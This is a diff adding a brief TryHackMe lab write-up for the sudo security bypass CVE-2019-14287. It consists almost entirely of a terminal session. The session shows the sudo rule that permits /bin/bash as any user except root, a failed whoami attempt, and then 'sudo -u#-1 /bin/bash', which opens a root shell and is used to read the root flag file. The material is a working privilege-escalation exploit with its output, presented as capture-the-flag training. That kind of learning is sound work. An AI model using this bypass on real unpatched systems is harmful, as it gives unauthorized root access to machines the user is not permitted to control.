@@ -1,0 +1,24 @@
+# TryHackMe: Sudo Security Bypass CVE-2019-14287 
+
+# PoC
+```
+tryhackme@sudo-privesc:~$ sudo -l
+Matching Defaults entries for tryhackme on sudo-privesc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tryhackme may run the following commands on sudo-privesc:
+    (ALL, !root) NOPASSWD: /bin/bash
+tryhackme@sudo-privesc:~$ sudo whoami
+[sudo] password for tryhackme: 
+Sorry, user tryhackme is not allowed to execute '/usr/bin/whoami' as root on sudo-privesc.
+tryhackme@sudo-privesc:~$ sudo -u#-1 whoami
+[sudo] password for tryhackme: 
+Sorry, user tryhackme is not allowed to execute '/usr/bin/whoami' as #-1 on sudo-privesc.
+tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
+root@sudo-privesc:~# whoami
+root
+root@sudo-privesc:~# ls
+root@sudo-privesc:~# cat /root/root.txt
+THM{l33t_s3cur1ty_bypass}
+root@sudo-privesc:~# 
+```
